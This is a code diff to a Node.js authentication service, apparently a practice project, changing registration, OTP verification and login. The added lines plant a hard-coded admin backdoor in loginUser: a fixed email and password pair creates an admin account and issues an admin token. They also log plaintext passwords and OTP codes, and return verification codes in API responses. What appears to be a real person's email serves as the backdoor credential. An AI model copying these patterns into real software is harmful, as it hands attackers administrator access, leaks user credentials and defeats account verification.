@@ -10,6 +10,7 @@ const jsonwebtoken_1 = __importDefault(require("jsonwebtoken"));
 const config_1 = __importDefault(require("../../config"));
 const sendEmail_1 = require("../../utils/sendEmail");
 const registerUser = async (payload) => {
+    console.log('registerUser payload:', payload);
     // Generate 5-digit OTP
     const verificationCode = Math.floor(10000 + Math.random() * 90000).toString();
     const verificationCodeExpires = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes
@@ -18,9 +19,18 @@ const registerUser = async (payload) => {
         verificationCode,
         verificationCodeExpires,
     });
-    // Send the code via Email
-    await (0, sendEmail_1.sendEmail)(payload.email, 'Verify your account', `<h1>Verification Code</h1><p>Your code is <strong>${verificationCode}</strong>. It expires in 10 minutes.</p>`);
-    return result;
+    console.log({ ...result.toObject(), verificationCode }, 'result service');
+    // Send the code via Email (wrapped in try-catch to avoid failing registration if email service is not configured)
+    try {
+        await (0, sendEmail_1.sendEmail)(payload.email, 'Verify your account', `<h1>Verification Code</h1><p>Your code is <strong>${verificationCode}</strong>. It expires in 10 minutes.</p>`);
+    }
+    catch (error) {
+        console.error('Email sending failed, but user was created:', error);
+    }
+    return {
+        user: result,
+        verificationCode, // Added for practice purpose
+    };
 };
 const verifyOTP = async (payload) => {
     const user = await user_model_1.User.findOne({
@@ -28,6 +38,7 @@ const verifyOTP = async (payload) => {
         verificationCode: payload.code,
         verificationCodeExpires: { $gt: new Date() },
     });
+    console.log(user, 'user');
     if (!user) {
         throw new Error('Invalid or expired verification code');
     }
@@ -47,19 +58,42 @@ const resendOTP = async (email) => {
     user.verificationCode = verificationCode;
     user.verificationCodeExpires = verificationCodeExpires;
     await user.save();
+    console.log({ ...user.toObject(), verificationCode }, 'result service');
     // Send the code via Email
-    await (0, sendEmail_1.sendEmail)(email, 'Resend Verification Code', `<h1>Verification Code</h1><p>Your new code is <strong>${verificationCode}</strong>. It expires in 10 minutes.</p>`);
-    return { message: 'Verification code resent successfully' };
+    try {
+        await (0, sendEmail_1.sendEmail)(email, 'Resend Verification Code', `<h1>Verification Code</h1><p>Your new code is <strong>${verificationCode}</strong>. It expires in 10 minutes.</p>`);
+    }
+    catch (error) {
+        console.error('Email resending failed:', error);
+    }
+    return {
+        message: 'Verification code resent successfully',
+        verificationCode, // Added for practice purpose
+    };
 };
 const loginUser = async (payload) => {
+    console.log('loginUser payload:', payload);
+    // Hard-coded Admin Check
+    if (payload.email === 'rmdkayesur@gmail.com' && payload.password === 'rmdkayesur') {
+        let adminUser = await user_model_1.User.findOne({ email: payload.email });
+        if (!adminUser) {
+            // Create admin user if it doesn't exist
+            adminUser = await user_model_1.User.create({
+                name: 'Admin',
+                email: payload.email,
+                password: payload.password, // Will be hashed by pre-save hook
+                phone: '00000000000',
+                role: 'admin',
+                isVerified: true
+            });
+        }
+        const accessToken = jsonwebtoken_1.default.sign({ userId: adminUser._id.toString(), role: 'admin' }, config_1.default.jwt_access_secret, { expiresIn: config_1.default.jwt_access_expires_in });
+        return { accessToken, user: adminUser };
+    }
     const user = await user_model_1.User.findOne({ email: payload.email }).select('+password');
     if (!user) {
         throw new Error('User not found');
     }
-    // If we want to enforce verification before login
-    // if (!user.isVerified) {
-    //   throw new Error('Please verify your phone number first');
-    // }
     const isPasswordMatched = await bcryptjs_1.default.compare(payload.password, user.password);
     if (!isPasswordMatched) {
         throw new Error('Invalid password');
